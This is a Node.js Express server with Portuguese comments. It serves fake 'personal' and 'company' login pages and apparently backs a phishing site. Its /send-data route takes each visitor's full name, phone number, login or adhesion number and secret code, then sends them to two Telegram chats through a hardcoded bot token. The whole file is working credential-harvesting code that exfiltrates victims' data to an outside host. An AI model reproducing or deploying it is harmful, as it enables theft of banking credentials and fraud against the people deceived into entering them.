const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');
const axios = require('axios');
const app = express();
const port = process.env.PORT || 3000;

// Middleware para parsear JSON e dados de formulário
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Servir arquivos estáticos
app.use(express.static(path.join(__dirname, 'public')));

// Rota inicial - serve a página de login normal
app.get('/login-normal', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'loginormal.html'));
});

// Rota para login de empresa
app.get('/login-empresa', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'loginempresa.html'));
});

// Rota raiz - opcional: pode servir uma página inicial
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'loginormal.html')); // Ou uma página inicial
});

// Rota para receber os dados do formulário e enviar para o Telegram
app.post('/send-data', async (req, res) => {
  try {
    const { fullname, phone, login, password, formType } = req.body;

    // Log para depuração
    console.log('Dados recebidos:', { fullname, phone, login, password, formType });

    // Validação básica dos dados
    if (!fullname || !phone || !login || !password || !formType) {
      console.error('Campos obrigatórios ausentes:', { fullname, phone, login, password, formType });
      return res.status(400).json({ success: false, message: 'Todos os campos são obrigatórios' });
    }

    // Define o tipo de formulário para a mensagem
    let formLabel;
    if (formType === 'normal') {
      formLabel = 'Pessoa Física';
    } else if (formType === 'empresa') {
      formLabel = 'Empresa';
    } else {
      console.error('formType inválido:', formType);
      return res.status(400).json({ success: false, message: 'Tipo de formulário inválido' });
    }

    // Configurações do Telegram
    const token = '7045955625:AAGaTLknx9YYk3powiCXn_R6sIGOP8f3bcE';
    const chatIds = ['5114449108', '6489258446'];
    const message = `Novo Login de Cliente (${formLabel}):
Nome: ${fullname}
Telefone: ${phone}
Nome/Nº Adesão: ${login}
Código Secreto: ${password}`;

    // URL da API do Telegram
    const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage`;

    // Envia a mensagem para cada chatId
    for (const chatId of chatIds) {
      try {
        const response = await axios.post(telegramUrl, {
          chat_id: chatId,
          text: message
        });
        console.log(`Mensagem enviada para chatId ${chatId}:`, response.data);
      } catch (error) {
        console.error(`Erro ao enviar para chatId ${chatId}:`, error.message);
      }
    }

    console.log('Dados enviados para o Telegram:', { fullname, phone, login, formType });
    res.json({ success: true, message: 'Dados enviados com sucesso' });

  } catch (error) {
    console.error('Erro ao enviar para o Telegram:', error);
    res.status(500).json({ success: false, message: 'Erro ao enviar dados' });
  }
});

// Inicia o servidor
app.listen(port, () => {
  console.log(`Servidor rodando em http://localhost:${port}`);
});